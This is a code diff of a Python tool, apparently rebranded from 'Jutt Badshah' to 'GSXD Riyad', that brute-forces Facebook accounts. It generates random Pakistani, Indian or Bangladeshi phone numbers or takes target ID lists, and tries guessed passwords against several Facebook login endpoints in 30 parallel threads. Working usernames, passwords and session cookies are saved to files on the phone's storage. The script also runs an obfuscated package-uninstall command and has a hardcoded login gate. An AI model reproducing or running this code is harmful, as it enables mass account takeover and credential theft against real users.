@@ -1,6 +1,3 @@
-#!/usr/bin/python3
-#-*-coding:utf-8-*-
-#made by coding jutt badshah
 import os
 print ('\033[0;'+'30'+'m')
 os.system('pip '+'u'+'n'+'in'+'st'+'all '+'re'+'qu'+'es'+'ts urllib3 idna certifi charset_normalizer '+'-'+'y')
@@ -26,7 +23,7 @@ except ImportError:
     os.system('pip install bs4')
 try:
     import os, sys, time, datetime, re, bs4, json, random, requests, subprocess, platform, uuid, string, base64
-    from concurrent.futures import ThreadPoolExecutor as JuttBadshah
+    from concurrent.futures import ThreadPoolExecutor as GSXDRiyad
     from datetime import datetime
     from bs4 import BeautifulSoup
     from requests.exceptions import ConnectionError
@@ -38,7 +35,7 @@ except (ModuleNotFoundError,FileNotFoundError):
 #os.system('git '+'con'+'fig '+'--'+'g'+'et rem'+'ote.or'+'igi'+'n.'+'url '+'> .h.txt')
 #hulo = open('.h.txt', 'r').read()
 #os.system('rm -rf .h.txt')
-#gulo = 'https://'+'gi'+'th'+'ub'+'.co'+'m/'+'SH'+'OO'+'TE'+'R-'+'MA'+'KE'+'R/'+'Jutt'+'Bad'+'sh'+'ah'
+#gulo = 'https://'+'gi'+'th'+'ub'+'.co'+'m/'+'SH'+'OO'+'TE'+'R-'+'MA'+'KE'+'R/'+'GSXD'+'Bad'+'sh'+'ah'
 #if not gulo in hulo:
 #    os.system('clear')
 #    print ('\n\n\n\n\nsomething wrong')
@@ -75,6 +72,7 @@ try:
     os.mkdir('/sdcard/ids')
 except:
     pass
+EE = '\r\r\x1b[38;5;208m'
 PP = '\x1b[1;37m'
 MM = '\x1b[1;31m'
 HH = '\x1b[1;32m'
@@ -205,7 +203,7 @@ ROG = 'd'+'h'
 GOG = ASG+WMK+SSH+SSG
 AOG = BDG+DOG+FOG
 gd = '/home'
-ff = '/JuttBadshah'
+ff = '/GSXDRiyad'
 lol = os.getcwd()
 #if tz+gz+yv+gd+ff not in lol:
     #print ('\n\nSomething Wrong\n\n\nContect To Admin\n\n\nWhatsApp Number > +923007574310')
@@ -217,11 +215,30 @@ except requests.exceptions.ConnectionError:
     print ('\n\n\n\n\033[0;97mNo internet Conection\n')
     sys.exit()
 if ATS not in __req:
-    print ('\n\n You Cant recode it bro its Jutt Badshah Brand\n\nAdmin Contect Numbr 03007574310')
+    print ('\n\n You Cant recode it bro its GSXD Riyad Brand\n\nAdmin Contect Numbr 03007574310')
     exit()
 if 'update' in __req:
     print ('\n\n\n\n\033[0;97mScript Has Been Updating\n\nAdmin Whatsapp Numbr 03007574310')
     exit()
+
+import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input('\033[1;92mUser Name:\033[1;37m ')
+    password = input('\033[1;92mPassword:\033[1;37m ')
+
+    if username == 'uzzal@' and password == 'uzzal@':    	
+        print('\033[1;92mYou have successfully logged in.')
+        break
+    else:
+        print('\033[91;1mIncorrect Please Trying ')
+        #def pw():
+        attemps += 1
+        continue
+os.system('clear')
+
 XB = 'ti'
 GF = 'ny'+'url.'
 JK = 'com/'
@@ -233,22 +250,18 @@ ZS = 'j'+'v'+'d'+'v'
 os.system('git pull')
 os.system('clear')
 logo4 = """
-\x1b[1;91m
-\x1b[1;92m
-\x1b[1;96m
-\x1b[1;92m         {|} {|}  {|} {|}{|}{|} {|}{|}{|}
-\x1b[1;97m         {|} {|}  {|}    {|}       {|}
-\x1b[1;93m         {|} {|}  {|}    {|}       {|}
-\x1b[1;96m         {|} {|}  {|}    {|}       {|}
-\x1b[1;94m     {|}{|}   {|}{|}     {|}       {|}
-\x1b[1;93m
-\x1b[1;92m      v   Jutt Badshah Brand~
-\x1b[1;91m-----------------------------------------------
-\x1b[1;97m> Author : Jutt Badshah
-\x1b[1;97m> Github : https://github.com/SHOOTER-MAKER
-\x1b[1;97m> Facebok: Jutt Badshah
-\x1b[1;97m> Version: 2.8
-\x1b[1;91m-----------------------------------------------"""
+  ██████╗ ███████╗    ██████╗     ██╗  ██╗
+██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
+██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
+██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
+╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
+ ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
+\033[1;92m╔═════════════════════════════════════════╗
+\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
+\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
+\033[1;92m║ ᗙ  Version  : 0.3                       ║
+\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
+\033[1;92m╚═════════════════════════════════════════╝"""
 
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 motd=[]
@@ -258,7 +271,7 @@ motd=[]
 def hasil(ok,f2,cp):
     print (47*'\033[0;97m-')
     print ('\033[1;36mProccess Has Been Complete\033[0;97m')
-    print (47*'-')
+    print (43*'-')
     print ('\033[1;32mTotal ids > Ok/' +str(len(ok)) + ' 2F/' +str(len(f2)) + ' CP/' + str(len(cp)))
     ok.clear()
     f2.clear()
@@ -393,7 +406,7 @@ class crack:
         print ('\033[1;32m[3] Random Number Cloning')
         print ('\033[1;32m[4] Random Email Cloning')
         print ('\033[1;32m[0] Back Menu\033[0;97m')
-        print (47*'-')
+        print (43*'-')
         vg = input('\033[1;36mSelect: \033[0;97m')
         if vg == '1':
             try:
@@ -430,7 +443,7 @@ class crack:
             os.system('clear')
             print (logo4)
             print ('\033[1;33m~~~~~~~~Public id Cloning Menu\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             idt = input(' \x1b[1;96m[\xe2\x98\x85]Enter id: \x1b[0;97m ')
             id = []
             knt = '.ou.txt'
@@ -508,7 +521,7 @@ class crack:
             print (logo4)
             print ('')
             try:
-                r = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/Juttbrand/main/lol.txt').text
+                r = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/GSXDbrand/main/lol.txt').text
             except requests.exceptions.ConnectionError:
                 os.system('clear')
                 print (logo4)
@@ -541,7 +554,7 @@ class crack:
 
     def __mbasic__(self,user,__juts__,_jat):
         global ok,f2,cp
-        sys.stdout.write(f'\r {OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -594,9 +607,9 @@ class crack:
                 cok = ses.cookies.get_dict()
                 if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                    print(f"\r{HH}[OK-JUTT] {user} | {pw} {VV}    ")
-                    open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
-                    open("/sdcard/JUTT_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
+                    print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
+                    open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
+                    open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
@@ -612,7 +625,7 @@ class crack:
 
     def __randoms__(self,user,__juts__,_jat):
         global ok,f2,cp
-        sys.stdout.write(f'\r {OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r {OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -661,12 +674,11 @@ class crack:
                 }
                 rex = ses.post('https://'+_jat+link.get('action'), data=data, headers=_head2, allow_redirects=False)
                 cok = ses.cookies.get_dict()
-                if "c_user" in str(cok):
                     coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                     user=cok['c_user']
-                    print(f"\r{HH}[OK-JUTT] {user} | {pw} {VV}    ")
-                    open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
-                    open("/sdcard/JUTT_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
+                    print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
+                    open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
+                    open("/sdcard/GSXD_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
@@ -674,13 +686,13 @@ class crack:
                     user=cok['checkpoint'][13:28]
                     if 'Enter login code to continue' in str(rex.text):
                         Mm = '\033[9;31m'
-                        print(f"\r{Mm}[2F-JUTT] {user} | {pw}{VV}     ")
-                        open("/sdcard/JUTT_2F.txt", "a").write(user + "|" + pw + "\n")
+                        print(f"\r{Mm}[2F-GSXD] {user} | {pw}{VV}     ")
+                        open("/sdcard/GSXD_2F.txt", "a").write(user + "|" + pw + "\n")
                         f2.append(user + pw)
                         break
                     else:
-                        print(f"\r{BB}[CP-JUTT] {user} | {pw}{VV}     ")
-                        open("/sdcard/JUTT_CP.txt", "a").write(user + "|" + pw + "\n")
+                        print(f"\r{EE}[CP-GSXD] {user} | {pw}{VV}     ")
+                        open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
                         cp.append(user + pw)
                         break
                 else:
@@ -691,7 +703,7 @@ class crack:
 
     def __free__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -769,15 +781,13 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-JUTT] {used} | {pw} {VV}    ")
-                        open("/sdcard/JUTT_OK.txt", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/JUTT_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
+                        open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
-                        print(f"\r\033[1;33m[TL-JUTT] {used} | {pw} {VV}    ")
+                        print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
                         tl.append(used + pw)
                         break
                 elif "Login approvals are on" in str(q) or "two_factor" in str(q):
@@ -792,8 +802,8 @@ class crack:
                             used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
-                    open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
+                    print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                    open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
                 elif 'User must verify their account' in str(q):
@@ -821,13 +831,13 @@ class crack:
                         used = user
                     if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                         Mm = '\033[9;31m'
-                        print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
-                        open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
+                        print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                        open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                         f2.append(used + pw)
                         break
                     else:
-                        print(f"\r{BB}[CP-JUTT] {used} | {pw} {VV}    ")
-                        open("/sdcard/JUTT_CP.txt", "a").write(used + "|" + pw + "\n")
+                        print(f"\r{EE}[CP-GSXD] {used} | {pw} {VV}    ")
+                        open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                         cp.append(used + pw)
                         break
                 else:
@@ -838,7 +848,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[Crack] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -919,15 +929,13 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-JUTT] {used} | {pw} {VV}    ")
-                        open("/sdcard/JUTT_OK.txt", "a").write(used + "|" + pw + "\n")
-                        open("/sdcard/JUTT_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
+                        open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
+                        open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
-                        follow_id='100000160984736'
-                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
-                        print(f"\r\033[1;33m[TL-JUTT] {used} | {pw} {VV}    ")
+                        print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
                         tl.append(used + pw)
                         break
                 elif "Login approvals are on" in str(q) or "two_factor" in str(q):
@@ -942,8 +950,8 @@ class crack:
                             used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{Mm}[2F-JUTT] {used} | {pw}{VV}     ")
-                    open("/sdcard/JUTT_2F.txt", "a").write(used + "|" + pw + "\n")
+                    print(f"\r{Mm}[2F-GSXD] {used} | {pw}{VV}     ")
+                    open("/sdcard/GSXD_2F.txt", "a").write(used + "|" + pw + "\n")
                     f2.append(used + pw)
                     break
                 elif 'User must verify their account' in str(q):
@@ -969,8 +977,8 @@ class crack:
                                 used=user
                     if len(used)<11 or len(used)>15:
                         used = user
-                    print(f"\r{BB}[CP-JUTT] {used} | {pw} {VV}    ")
-                    open("/sdcard/JUTT_CP.txt", "a").write(used + "|" + pw + "\n")
+                    print(f"\r{EE}[CP-GSXD] {used} | {pw} {VV}    ")
+                    open("/sdcard/GSXD_CP.txt", "a").write(used + "|" + pw + "\n")
                     cp.append(used + pw)
                     break
                 else:
@@ -998,66 +1006,57 @@ class crack:
         urlPost = session.post('https://mbasic.facebook.com//login/device-based/regular/login/?refsrc=deprecated&ht_token=Abuoy_rVa4YbV3uUOG3LIulpRGEaork_ctTnh3PiOcI1VmTq&h_consent=1&ht_l=login&lwv=100&ref=dbl', data=data)
         cok = session.cookies.get_dict()
         if "c_user" in str(cok):
-            print(f"\r{HH}[OK-JUTT] {user} | {pw} {VV}    ")
-            open("/sdcard/JUTT_OK.txt", "a").write(user + "|" + pw + "\n")
+            print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV}    ")
+            open("/sdcard/GSXD_OK.txt", "a").write(user + "|" + pw + "\n")
             ok.append(user + pw)
         elif 'Enter login code to continue' in urlPost.text:
             Mm = '\033[9;31m'
-            print(f"\r{Mm}[2F-JUTT] {user} | {pw}{VV}     ")
-            open("/sdcard/JUTT_2F.txt", "a").write(user + "|" + pw + "\n")
+            print(f"\r{Mm}[2F-GSXD] {user} | {pw}{VV}     ")
+            open("/sdcard/GSXD_2F.txt", "a").write(user + "|" + pw + "\n")
             f2.append(user + pw)
         else:
-            print(f"\r{BB}[CP-JUTT] {user} | {pw} {VV}    ")
-            open("/sdcard/JUTT_CP.txt", "a").write(user + "|" + pw + "\n")
+            print(f"\r{EE}[CP-GSXD] {user} | {pw} {VV}    ")
+            open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
             cp.append(user + pw)
 
-    def follow(self,coki):
-        session = requests.Session()
-        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
-        for x in r.find_all("a",href=True):
-            if "/a/subscribe.php" in x.get('href'):
-                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
-        #if '/a/subscribe.php' in str(r):
-            #b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
-            #session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
-        #else:
-            #pass
 
     def __pler_(self):
         os.system('clear')
         print (logo4)
         motd.clear()
         print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
-        print (47*'-')
+        print (43*'-')
         print ('\033[1;32m[1] Method 1')
         print ('\033[1;32m[2] Method 2')
         print ('\033[1;32m[3] Method 3')
-        print (47*'-')
+        print (43*'-')
         vz = input('\033[1;36mSelect: \033[0;97m')
         if vz in ['1', '2', '3']:
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;32m[1] Crack (Fast)')
             print ('\033[1;32m[2] Crack (Slow)')
             motd.append('file')
             print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
             uz = input('\033[1;36mSelect: \033[0;97m')
             time.sleep(0.5)
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;33m~Use Flight Mode 5 Second After Every 10 mint~\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             time.sleep(0.5)
             print (self.apk)
             time.sleep(0.5)
             print (' \x1b[1;97mCrack Running\x1b[1;97m ')
             time.sleep(0.5)
-            print (47*'-')
-            print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
+            print ('\x1b[1;92m   ~~~~~~~GS TEAM TOOLS FACEBOOK CLONE~~~~~~~\x1b[1;97m')
             time.sleep(0.5)
-            print (47*'-')
-            with JuttBadshah(max_workers=30) as (__juttbrand__):
-                for juttxd in self.id:
+            print (43*'-')
+            with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
+                for GSXDxd in self.id:
                     try:
-                        uid, name = juttxd.split('|')
+                        uid, name = GSXDxd.split('|')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             hf = self.ggs.replace("First", xz[0]).replace("first", xz[0].lower()).replace("Last", xz[1]).replace("last", xz[1].lower()).replace("Name", name).replace("name", name.lower()).splitlines()
@@ -1068,25 +1067,25 @@ class crack:
                         url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                         url3 = 'https://b-api.facebook.com/method/auth.login'
                         if vz == '1' and uz == '1':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                         elif vz == '1' and uz == '2':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
                         elif vz == '1' and uz == '3':
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
                         elif vz == '2' and uz == '1':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         elif vz == '2' and uz == '2':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url2)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url2)
                         elif vz == '2' and uz == '3':
-                            __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         elif vz == '3' and uz == '1':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                         elif vz == '3' and uz == '2':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                         elif vz == '3' and uz == '3':
-                            __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                            __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                         else:
-                            __juttbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
+                            __GSXDbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                     except:
                         pass
 
@@ -1103,16 +1102,18 @@ class crack:
         print ('\033[1;32m[2] indian ids Clone')
         print ('\033[1;32m[3] bangladesh ids clone')
         print ('\033[1;32m[0] Back\033[0;97m')
-        print (47*'-')
+        print (43*'-')
         tg = input('\033[1;36mSelect: \033[0;97m')
         if tg == '1':
             os.system('clear')
             print (logo4)
             print ('\033[1;33mEnter Pakistani Number Code\033[0;97m')
             print ('\033[1;33mExample 0300,0301,0312,0345,etc,,,\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             os.system('rm -rf .num.txt')
             k = input('\033[1;36mEnter Code: \033[0;97m')
+            os.system('clear')
+            print (logo4)
             print ('\033[1;33mExample 1000,2000,3000,4000,5000\033[0;97m')
             try:
                 cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
@@ -1122,7 +1123,7 @@ class crack:
                 nmbr = ''.join(random.choice(string.digits) for _ in range(7))
                 open('.num.txt', 'a').write(nmbr + '|' + '\n')
             self.id = open('.num.txt', 'r').read().splitlines()
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;32m[1]Auto Password')
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
@@ -1138,9 +1139,9 @@ class crack:
                     jdg = 1
                 y = 0
                 chsss = []
-                print (47*'-')
+                print (43*'-')
                 print ('\033[1;33mExample: number, fullnumber, khankhan, baloch\033[0;97m')
-                print (47*'-')
+                print (43*'-')
                 for y in range(jdg):
                     y += 1
                     pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
@@ -1148,20 +1149,23 @@ class crack:
                 helo = '\n'.join(chsss)
                 pwzzz = (helo + '\n')
                 chsss.clear()
-                print (47*'-')
+                print (43*'-')
             else:
                 pwz=['number', 'fullnumber', 'khankhan', 'baloch']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
-            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
-            print (47*'-')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
+            print ('\033[1;33m~~~~~~~~~~~~~~~~Method Menu~~~~~~~~~~~~~~~~~\033[0;97m')
+            print (43*'-')
             print ('\033[1;32m[1] Method 1')
             print ('\033[1;32m[2] Method 2')
             print ('\033[1;32m[3] Method 3')
-            print (47*'-')
+            print (43*'-')
             vz = input('\033[1;36mSelect: \033[0;97m')
             if vz in ['1', '2', '3']:
-                print (47*'-')
+                print (43*'-')
                 print ('\033[1;32m[1] Crack (Fast)')
                 print ('\033[1;32m[2] Crack (Slow)')
                 print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
@@ -1170,39 +1174,42 @@ class crack:
                 time.sleep(0.5)
                 print (' \x1b[1;97mCrack Running\x1b[1;97m ')
                 time.sleep(0.5)
-                print (47*'-')
-                print ('\x1b[1;92m   ~~~~~~~Jutt Badshah King Of Facebook~~~~~~~\x1b[1;97m')
-                time.sleep(0.5)
-                print (47*'-')
-                with JuttBadshah(max_workers=30) as (__juttbrand__):
-                    for juttxd in self.id:
+                os.system('clear')
+                print (logo4)
+                print (43*'-')
+                print('\033[92;1m>>\033[1;37m METHOD     :\033[1;32m M'+vz)
+                print (43*'-')
+                print ("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m┇ \033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m ┇ \033[1;97mAIRPLANE MODE")
+                print (43*'-')
+                with GSXDRiyad(max_workers=30) as (__GSXDbrand__):
+                    for GSXDxd in self.id:
                         try:
-                            juid = juttxd.split('|')[0]
+                            juid = GSXDxd.split('|')[0]
                             uid = k+juid
                             pwx = pwzzz.replace('number', juid).replace('full', k).splitlines()
                             url1 = 'https://b-graph.facebook.com/auth/login'
                             url2 = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                             url3 = 'https://b-api.facebook.com/method/auth.login'
                             if vz == '1' and uz == '1':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                             elif vz == '1' and uz == '2':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                             elif vz == '1' and uz == '3':
-                                __juttbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
+                                __GSXDbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                             elif vz == '2' and uz == '1':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                             elif vz == '2' and uz == '2':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                             elif vz == '2' and uz == '3':
-                                __juttbrand__.submit(self.__free__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url3)
                             elif vz == '3' and uz == '1':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url1)
                             elif vz == '3' and uz == '2':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url2)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url2)
                             elif vz == '3' and uz == '3':
-                                __juttbrand__.submit(self.__mmb__,uid,pwx,url3)
+                                __GSXDbrand__.submit(self.__mmb__,uid,pwx,url3)
                             else:
-                                __juttbrand__.submit(self.__free__,uid,pwx,url1)
+                                __GSXDbrand__.submit(self.__free__,uid,pwx,url1)
                         except:
                             pass
 
@@ -1211,12 +1218,15 @@ class crack:
             os.system('clear')
             print (logo4)
             print ('\033[1;33mEnter Code 3 Digit indian Code\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             print ('\033[1;33mExample 766,941,981,962,809,745,etc.\033[0;97m')
-            print (47*'-')
+            print (43*'-')
             os.system('rm -rf .num.txt')
             k = '91'
             c = input('\033[1;36mEnter Code: \033[0;97m')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
             print ('\033[1;33mExample 1000,2000,3000,4000,5000\033[0;97m')
             try:
                 cb = int(input('\033[1;33mNumbers Limit: \033[0;97m'))
@@ -1227,7 +1237,9 @@ class crack:
                 open('.num.txt', 'a').write(nmbr + '|' + '\n')
             self.id = open('.num.txt', 'r').read().splitlines()
             os.system('rm -rf .num.txt')
-            print (47*'-')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
             print ('\033[1;32m[1]Auto Password')
             print ('\033[1;32m[2]Choice Password\033[0;97m')
             pas=input('\033[0;97mSelect: ')
@@ -1243,9 +1255,11 @@ class crack:
                     jdg = 1
                 y = 0
                 chsss = []
-                print (47*'-')
-                print ('\033[1;33mExample: number, india123, khankhan\033[0;97m')
-                print (47*'-')
+                os.system('clear')
+                print (logo4)
+                print (43*'-')
+                print ('\033[1;33mExample: number , india123 , khankhan , 57273200\033[0;97m')
+                print (43*'-')
                 for y in range(jdg):
                     y += 1
                     pass1 = input('\033[1;32mPassword %s: \033[0;97m'%(y))
@@ -1253,61 +1267,67 @@ class crack:
                 helo = '\n'.join(chsss)
                 pwzzz = (helo + '\n')
                 chsss.clear()
-                print (47*'-')
+                print (43*'-')
             else:
                 pwz=['number']
                 pwzz = '\n'.join(pwz)
                 pwzzz = (pwzz + '\n')
-            print ('\033[1;33m~~~~~~~~~~Method Menu~~~~~~~~~~\033[0;97m')
-            print (47*'-')
+            os.system('clear')
+            print (logo4)
+            print (43*'-')
+            print ('\033[1;33m~~~~~~~~~~~~~~~~METHOD MENU~~~~~~~~~~~~~~~~~\033[0;97m')
+            print (43*'-')
             print ('\033[1;32m[1] Method 1')
             print ('\033[1;32m[2] Method 2')
             print ('\033[1;32m[3] Method 3')
-            print (47*'-')
+            print (43*'-')
             vz = input('\033[1;36mSelect: \033[0;97m')
             if vz in ['1', '2', '3']:
-                print (47*'-')
                 print ('\033[1;32m[1] Crack (Fast)')
                 print ('\033[1;32m[2] Crack (Slow)')
                 print ('\033[1;32m[3] Crack (super slow)\033[0;97m')
                 uz = input('\033[1;36mSelect: \033[0;97m')
                 motd.append('random')
                 time.sleep(0.5)
-                print (' \x1b[1;97mCrack Running\x1b[1;97m ')
+                print (' \x1b[1;97m CRACK RUNNING\x1b[1;97m ')
                 time.sleep(0.5)
-                print (47*'-')
